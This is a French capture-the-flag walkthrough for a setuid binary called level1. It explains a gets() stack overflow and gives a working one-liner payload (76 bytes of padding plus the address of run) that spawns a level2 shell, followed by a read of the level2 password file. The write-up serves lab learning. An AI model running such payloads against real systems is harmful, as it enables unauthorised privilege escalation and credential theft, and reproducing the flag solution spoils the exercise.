# Level1 — Walkthrough

## 1. Objectif

Obtenir un shell avec les privilèges **level2** (binaire setuid) pour lire le mot de passe level2.

## 2. Inspection du binaire

- Setuid setgid level2, ELF 32-bit, dynamiquement linké, non strié.
- **main** : alloue un buffer sur la stack, appelle `gets(buffer)` — pas de contrôle de longueur.
- **run** : affiche "Good... Wait what?\n" puis appelle `system("/bin/sh")`. Cette fonction n’est jamais appelée dans le flux normal.

## 3. Vulnérabilité

- **Buffer overflow** via `gets()` : lecture sans limite dans un buffer de 64 octets (à esp+0x10).
- La stack frame fait 0x50 octets ; l’adresse de retour est à esp+0x54. L’offset exact peut varier (souvent **76** sur la VM au lieu de 68).
- En dépassant le buffer, on écrase l’adresse de retour et on redirige vers `run`.

## 4. Exploit

- Remplacer l’adresse de retour par **0x08048444** (adresse de `run`).
- Payload : **76** octets de padding + adresse en little endian : `"\x44\x84\x04\x08"` (si 76 ne marche pas, tester 72 ou 80).

## 5. Exécution

```bash
( python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat ) | ./level1
```

Le message "Good... Wait what?" s’affiche, puis un shell level2. Commande utile : `cat /home/user/level2/.pass`.

## 6. Récupération du mot de passe

Dans le shell : `cat /home/user/level2/.pass`, noter le mot de passe, puis `exit` et `ssh level2@localhost -p 4242`. Consigner le mot de passe dans `level1/flag`.
